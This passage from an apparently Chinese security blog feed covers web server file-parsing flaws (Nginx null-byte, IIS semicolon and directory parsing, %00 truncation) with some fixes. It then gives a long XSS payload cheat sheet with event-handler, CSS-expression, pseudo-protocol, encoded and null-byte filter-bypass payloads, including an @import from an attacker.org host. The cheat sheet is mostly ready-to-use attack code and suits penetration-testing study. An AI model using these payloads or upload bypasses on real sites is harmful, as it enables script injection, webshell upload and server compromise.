title="防御方法"></a>防御方法</h3><ul><li><p>1）使用Apache、IIS等成熟久经考验的服务器软件，在动态语言的支持上，Nginx还是太年经了。你应该也偶尔会见到有些网站挂掉了显示个nginx错误出来，却极少见网站挂掉显示不是nginx的(未备案，过期欠费 等等除外)。</p></li><li><p>2）上传目录、静态资源（CSS&#x2F;JS&#x2F;图片等）目录，都设置好屏蔽PHP执行权限。例如使用Apache服务器的<br>在相应目录下放一个 .htaccess 文件，里面写上</p></li><li><pre><code class="js">&lt;FilesMatch &quot;(?i:\.php)$&quot;&gt;    Deny from all&lt;/FilesMatch&gt;3）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 3）可以不提供原图访问，所有图片输出时都经过程序处理，也可以在上传存储时就处理一遍根本不保存原图；</span><br><span class="line"></span><br><span class="line">- 4）图片使用不同的服务器，这样可以与业务代码数据完全隔离，即使图片服务器被黑了，也不会泄漏多少信息；</span><br><span class="line"></span><br><span class="line">- 5)cgi.fix_pathinfo=0慎用，除非你十分确定该服务器上的所有项目都不会因此而无法运行。</span><br><span class="line"></span><br><span class="line">### 空字节代码执行漏洞</span><br><span class="line"></span><br><span class="line">旧版本（0.5.*，**0.6.*，0.7，0.8&lt;=0.7.65&lt;=0.8.37）。通过利用此漏洞，攻击者可以导致服务器使用PHP的FastCGI作为PHP的服务器上执行任何公开访问的文件。</span><br><span class="line"></span><br><span class="line">**恶意用户发出请求`http://example.com/file.ext％00.php`就会将file.ext作为PHP文件解析。**</span><br><span class="line"></span><br><span class="line">**如果一个攻击者可以控制文件的内容（即：使用头像上传形式）其结果是执行任意代码。Ngnix在遇到%00空字节时与后端FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码。**</span><br><span class="line"></span><br><span class="line">### 修复</span><br><span class="line"></span><br><span class="line">**1.禁止在上传文件目录下执行php。**</span><br><span class="line">**在nginx虚拟机配置或者fcgi.conf配置加如下代码**</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">if ($request_filename ~* (.*)\.php) &#123;</span><br><span class="line">    set $php_url $1;</span><br><span class="line">&#125;</span><br><span class="line">if (!-e $php_url.php) &#123;</span><br><span class="line">    return 403;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre></li></ul><p><strong>2.升级到最新版本的nginx</strong></p><h2 id="IIS5-x-6-x解析漏洞"><a href="#IIS5-x-6-x解析漏洞" class="headerlink" title="IIS5.x-6.x解析漏洞"></a>IIS5.x-6.x解析漏洞</h2><p><strong>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语言一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</strong></p><h3 id="目录解析-6-0"><a href="#目录解析-6-0" class="headerlink" title="目录解析(6.0)"></a>目录解析(6.0)</h3><p><strong>形式：<a href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a></strong><br><strong>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</strong></p><h3 id="文件解析（6-0）"><a href="#文件解析（6-0）" class="headerlink" title="文件解析（6.0）"></a>文件解析（6.0）</h3><p>形式：<a href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a><br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</p><h3 id="解析文件类型"><a href="#解析文件类型" class="headerlink" title="解析文件类型"></a>解析文件类型</h3><p>有的网站在上传检测中会用”黑名单”方法 ,但是IIS6.0 默认的可执行文件除了asp还包含这三种 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/test.asa</span><br><span class="line">/test.cer</span><br><span class="line">/test.cdx</span><br></pre></td></tr></table></figure><p><strong>iis为什么会把asa，cdx，cer解析成asp文件：原因是这四种扩展名都是用的同一个asp.dll文件来执行。</strong><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-95eb3257c442fb58.png" alt="图片.png"></p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p><strong>1.目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传<code>xx.asp;.jpg</code>类型的文件名。<br>2.做好权限设置，限制用户创建文件夹。</strong></p><h2 id="IIS7-5解析漏洞"><a href="#IIS7-5解析漏洞" class="headerlink" title="IIS7.5解析漏洞"></a>IIS7.5解析漏洞</h2><p>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。<br><strong>跟nginx解析漏洞一样，要在php.ini cgi.fix_pathinfo&#x3D;1 开启的情况才会产生。</strong></p><p>可以配合操作系统文件命名规则，上传不符合windows文件命名规则的文件名</p><blockquote><p>test.asp.<br>test.asp(空格)<br>test.php:1.jpg<br>test.php:: $DATA # php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名</p></blockquote><p><strong>会被windows系统自动去掉不符合规则符号后面的内，然后再配合这个解析漏洞来执行文件。</strong></p><h2 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h2><p>条件：php 版本&lt;5.3.4</p><ul><li>filename&#x3D;test.php%00.txt</li><li>1.上传时路径可控，使用00截断</li><li>2.文件下载时，00截断绕过白名单检查</li><li>3.文件包含时，00截断后面限制(主要是本地包含时)</li><li>4.其它与文件操作有关的地方都可能使用00截断。</li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><strong>在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，</strong></p><p><strong>若这样命名，windows会默认除去空格或点,黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单.若上传成功，空格和点都会被windows自动消除,这样也可以getshell。</strong></p><p><strong>这种方法可以配合文件解析漏洞从而产生更大的杀伤力。</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS Payload Quick Reference</title>
      <link href="/2020/07/02/XSS-Payload-Cheatsheet/"/>
      <url>/2020/07/02/XSS-Payload-Cheatsheet/</url>
      
        <content type="html"><![CDATA[<h2 id="触发事件XSS语句的总结"><a href="#触发事件XSS语句的总结" class="headerlink" title="触发事件XSS语句的总结"></a>触发事件XSS语句的总结</h2><ol><li>onmouseenter：当鼠标进入选区执行代码</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-color:red&quot; onmouseenter=&quot;alert(/XSS/)&quot;&gt;123456&lt;/div&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>onmouseleave：当鼠标离开选区执行代码</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;DIV onmouseleave=&quot;alert(/XSS/)&quot; style=&quot;BACKGROUND-COLOR: red&quot;&gt;123456&lt;/DIV&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>onmousewheel：当鼠标在选区滚轮时执行代码</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;DIV onmousewheel=&quot;alert(/XSS/)&quot; style=&quot;BACKGROUND-COLOR: red&quot;&gt;123456&lt;/DIV&gt;</span><br></pre></td></tr></table></figure><p><strong>FireFox浏览器使用DOMMouseScroll事件,其他（包括IE6）都是使用onmousewheel事件；</strong><br>4. onscroll：拖动滚动条执行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;width:100px;height:100px;overflow:scroll&quot; onscroll=&quot;alert(/XSS/)&quot;&gt;123456</span><br><span class="line">  &lt;br/&gt;</span><br><span class="line">  &lt;br/&gt;</span><br><span class="line">  &lt;br/&gt;</span><br><span class="line">  &lt;br/&gt;</span><br><span class="line">  &lt;br/&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><ol start="5"><li>onfocusin：当获得焦点时执行代码</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red&quot; onfocusin=&quot;alert(/XSS/)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure><ol start="6"><li>onfocusout：当失去焦点时执行代码</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red&quot; onfocusout=&quot;alert(/XSS/)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure><ol start="7"><li>onstart：当显示内容时执行代码</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee style=&quot;background-color:red&quot; onstart=&quot;alert(/XSS/)&quot; &gt;asdf&lt;/marquee&gt;</span><br></pre></td></tr></table></figure><ol start="8"><li>onbeforecopy：选中内容后复制执行代码</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">beforecopy:在发生复制操作前触发</span><br><span class="line">beforecut:在发生剪切操作前触发</span><br><span class="line">beforepaste:在发生粘贴操作前触发</span><br><span class="line">&lt;div style=&quot;background-color:red;&quot; onbeforecopy=&quot;alert(/XSS/)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure><p><strong>firefox不支持</strong><br>9. oncontextmenu：鼠标在选区右键执行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-color:red;&quot; oncontextmenu=&quot;alert(/XSS/)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>10、oncopy：复制时执行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-color:red;&quot; oncopy=&quot;alert(/XSS/)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>11、oncut：剪切时执行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; oncut=&quot;alert(/XSS/)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>12、ondrag、ondragenter、ondragover:选择内容并拖动时执行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-color:red;&quot; ondrag=&quot;alert(/XSS/)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>13、ondragend：选择内容并拖动松开鼠标执行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-color:red;&quot; ondragend=&quot;alert(/XSS/)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>14、ondragleave：选择内容并拖出边框执行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; ondragleave=&quot;alert(/XSS/)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>15、ondrop：有内容被拖动进来时执行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; style=&quot;&quot; ondrop=&quot;alert(/bem/)&quot; &gt;asdf&lt;/div&gt;</span><br><span class="line">&lt;div contentEditable=&quot;true&quot; style=&quot;&quot; ondrop=&quot;alert(/bem/)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>16、onpaste：黏贴时执行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; style=&quot;&quot; onpaste=&quot;alert(/bem/)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>17、onselectstart：选择内容时执行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; style=&quot;&quot; onselectstart=&quot;alert(/bem/)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>18、onhelp：进入焦点按F1时执行代码</p><p>IE 浏览器支持在 CSS 中扩展 JavaScript，这种技术称为动态特性。<br><strong>CSS行内样式：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;DIV STYLE=&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;&gt;</span><br><span class="line">&lt;img style=&quot;xss:expression(alert(0))&quot;&gt; // Works upto IE7.</span><br><span class="line">&lt;div style=&quot;color:rgb(&#x27;&#x27;x:expression(alert(1))&quot;&gt;&lt;/div&gt;      // Works upto IE7.</span><br><span class="line">&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt;      // Works upto IE7</span><br></pre></td></tr></table></figure><p><strong>仅IE支持，由于暴漏出来的种种缺点，微软最终从IE8 beta2(标准模式下)开始放弃对css表达式的支持。</strong></p><h2 id="CSS-import"><a href="#CSS-import" class="headerlink" title="CSS import"></a>CSS import</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">@import url(&quot;http://attacker.org/malicious.css&quot;);</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">malicious.css：</span><br><span class="line">body &#123;</span><br><span class="line">    color: expression(alert(&#x27;XSS&#x27;));</span><br><span class="line">&#125;</span><br><span class="line">为了绕过对 @import 的过滤，可以在 CSS 中使用反斜杠进行绕过：</span><br><span class="line">&lt;style&gt;</span><br><span class="line">@imp\ort url(&quot;http://attacker.org/malicious.css&quot;);</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">IE 浏览器会接受反斜杠，但是我们绕过了过滤器。</span><br></pre></td></tr></table></figure><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=javascript:prompt(/StoredXssByIframeTag/);&gt;&lt;/iframe&gt;  </span><br><span class="line">&lt;object data=data:text/html;base64,PHNjcmlwdD5wcm9tcHQoL1N0b3JlZFhzc0J5T2JqZW</span><br><span class="line">N0VGFnLyk7PC9zY3JpcHQ+&gt;&lt;/object&gt;  </span><br><span class="line">&lt;object data=&quot;javascript:alert(document.domain)&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="HTML5标签"><a href="#HTML5标签" class="headerlink" title="HTML5标签"></a>HTML5标签</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=prompt(/XSS/)&gt;  </span><br><span class="line">&lt;embed src=javascript:alert(/XSS/);&gt;  </span><br></pre></td></tr></table></figure><h2 id="js编码，html编码，十进制编码等"><a href="#js编码，html编码，十进制编码等" class="headerlink" title="js编码，html编码，十进制编码等"></a>js编码，html编码，十进制编码等</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src=javascript:alert(/XSS/);&gt; </span><br><span class="line">&lt;video&gt;&lt;source onerror=alert(String.fromCharCode(88,83,83))&gt;  (这个函数用于ascii码的还原）</span><br><span class="line">&lt;script/src=data:text/j\141v\141script,\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="链接标签里可以通过在-URL-中使用-js伪协议来执行-JavaScript："><a href="#链接标签里可以通过在-URL-中使用-js伪协议来执行-JavaScript：" class="headerlink" title="链接标签里可以通过在 URL 中使用 js伪协议来执行 JavaScript："></a>链接标签里可以通过在 URL 中使用 js伪协议来执行 JavaScript：</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;test&#x27;)&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">上面这段代码不匹配正则表达式，但是浏览器依旧会执行它，因为浏览器会首先进行 URL 解码操作。</span><br></pre></td></tr></table></figure><p><strong>另外，我们还可以使用 VBScript，虽然它在 IE11 中被禁用了，但依旧可以运行在旧版本的 IE或者启用兼容模式的 IE11 上。我们可以使用类似上面 JavaScript 的方式来插入 VBScript 代码：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;vbscript:MsgBox(&quot;XSS&quot;)&#x27;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="使用标签"><a href="#使用标签" class="headerlink" title="使用标签"></a>使用标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">alert(33)</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert(navigator.userAgent)<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(88199)</span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>confirm(88199)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>prompt(88199)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>\u0061\u006C\u0065\u0072\u0074(88199)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/XSS/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">`XSS`</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">data:text/javascript,alert(88199)</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">setTimeout</span>(<span class="title function_">alert</span>(<span class="number">88199</span>),<span class="number">0</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(21)</span>&gt;</span>Mformaction 属性覆盖 form 元素的actionHTML 5 <span class="tag">&lt;<span class="name">form</span>&gt;</span> action 属性&quot;) 属性。</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onsubmit</span>=<span class="string">alert(23)</span>&gt;</span><span class="tag">&lt;<span class="name">button</span>&gt;</span>M</span><br><span class="line">&lt;body/onload=alert(25)&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onscroll</span>=<span class="string">alert(26)</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span>//input获得焦点实现自动滚动</span><br><span class="line"></span><br><span class="line">&lt;iframe/onload=alert(document.domain)&gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(29);&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">IFRAME</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="短payload"><a href="#短payload" class="headerlink" title="短payload"></a>短payload</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;q/oncut=alert(1)&gt; </span><br></pre></td></tr></table></figure><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>JavaScript是很灵活的语言，可以使用十六进制、Unicode、HTML等进行编码，以下属性可以被编码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">（支持HTML, Octal, Decimal,Hexadecimal, and Unicode）</span><br><span class="line">href=</span><br><span class="line">action=</span><br><span class="line">formaction=</span><br><span class="line">location=</span><br><span class="line">on*=</span><br><span class="line">name=</span><br><span class="line">background=</span><br><span class="line">poster=</span><br><span class="line">src=</span><br><span class="line">code=</span><br><span class="line">data= //只支持base64</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(“xss”);&lt;/script&gt;可以转换为：</span><br><span class="line">%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%78%73%73%22%29%3b%3c%2f%73%63%72%69%70%74%3e</span><br></pre></td></tr></table></figure><h2 id="运算弹窗"><a href="#运算弹窗" class="headerlink" title="运算弹窗"></a>运算弹窗</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">     <span class="keyword">var</span> test = <span class="string">&quot;&quot;</span>-<span class="title function_">alert</span>(<span class="number">1</span>)-<span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">=右边是表达式，先要计算表达式的值，再赋值</span><br><span class="line">第一步执行alert(1)，弹出对话框</span><br><span class="line">第二步执行空字符串减alert(1)的返回值，也就是0-undefined，结果是NaN</span><br><span class="line">第三步执行NaN减空串，结果是NaN</span><br><span class="line">第四步执行赋值，test的值就是NaN</span><br></pre></td></tr></table></figure><h2 id="空字节"><a href="#空字节" class="headerlink" title="空字节"></a>空字节</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">最长用来绕过mod_security防火墙，形式如下：</span><br><span class="line">&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt;</span><br><span class="line">&lt;scri\x00pt&gt;alert(1);&lt;/scri%00pt&gt;</span><br><span class="line">&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt;</span><br><span class="line">空字节只适用于PHP 5.3.8以上的版本</span><br></pre></td></tr></table></figure><h2 id="语法BUG"><a href="#语法BUG" class="headerlink" title="语法BUG"></a>语法BUG</h2><p>RFC声明中节点名称不能是空格，以下的形式在javascript中不能运行</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%0ascript&gt;alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;%0bscript&gt;alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&lt;%, &lt;&#x2F;&#x2F;, 